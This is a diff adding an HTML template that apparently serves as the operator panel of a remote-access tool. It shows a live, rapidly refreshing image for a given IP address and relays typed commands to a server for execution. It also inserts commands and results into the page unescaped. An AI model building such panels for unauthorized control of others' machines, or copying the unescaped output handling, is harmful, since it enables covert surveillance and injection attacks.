@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>View Images for <%= ip %></title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background-color: #f0f0f0;
+      margin: 0;
+      padding: 20px;
+    }
+    h1 {
+      margin-bottom: 20px;
+    }
+    .images {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+    }
+    .images img {
+      max-width: 200px;
+      margin: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .terminal {
+      background-color: #333;
+      color: #fff;
+      padding: 10px;
+      border-radius: 5px;
+      margin-top: 20px;
+      width: 400px;
+      max-width: 100%;
+    }
+    .input-container {
+      display: flex;
+      margin-top: 10px;
+    }
+    .input-container input {
+      flex: 1;
+      padding: 5px;
+      margin-right: 10px;
+    }
+    .button {
+      background-color: #4caf50;
+      border: none;
+      color: white;
+      padding: 7px 15px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 12px;
+      margin: 4px 2px;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Images for <%= ip %></h1>
+  <div class="images">
+    <img id="renderImage" src="/render-image/<%= ip %>" alt="Render Image">
+  </div>
+  <div class="terminal" id="terminal">
+    <div id="terminalOutput">Terminal output will appear here...</div>
+    <div class="input-container">
+      <input type="text" id="commandInput" placeholder="Enter a command">
+      <button class="button" onclick="executeCommand()">Execute</button>
+    </div>
+  </div>
+  <script>
+    function updateImage() {
+      var img = document.getElementById('renderImage');
+      var newImg = new Image();
+      newImg.onload = function() {
+        img.src = newImg.src;
+      };
+      newImg.src = '/render-image/<%= ip %>?' + new Date().getTime();
+    }
+    
+    setInterval(updateImage, 100);
+    
+    function executeCommand() {
+      var commandInput = document.getElementById('commandInput');
+      var command = commandInput.value;
+      console.log('Executing command:', command);
+      commandInput.value = ''; // Clear the input
+      // Send the command to the server
+      fetch('/send-command', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ cmd: command })
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log('Command sent successfully.');
+          // Append the command to the terminal output
+          var terminalOutput = document.getElementById('terminalOutput');
+          terminalOutput.innerHTML += '<div>$ ' + command + '</div>';
+        } else {
+          console.error('Failed to send command:', response.statusText);
+        }
+      })
+      .catch(error => console.error('Error sending command:', error));
+    }
+    
+    // Function to append output to the terminal
+    function appendToTerminal(output) {
+      var terminalOutput = document.getElementById('terminalOutput');
+      terminalOutput.innerHTML += '<div>' + output + '</div>';
+    }
+    
+    // Function to continuously fetch results from the server
+    function fetchResults() {
+      fetch('/result-executed')
+      .then(response => {
+        if (response.ok) {
+          return response.text();
+        } else {
+          throw new Error('Failed to fetch result');
+        }
+      })
+      .then(result => {
+        if (result) {
+          console.log('Result received:', result);
+          appendToTerminal(result); // Append the result to the terminal output
+        }
+      })
+      .catch(error => console.error('Error fetching result:', error))
+      .finally(() => setTimeout(fetchResults, 2000)); // Fetch again after 2 seconds
+    }
+    
+    // Start fetching results when the page loads
+    fetchResults();
+  </script>
+</body>
+</html>
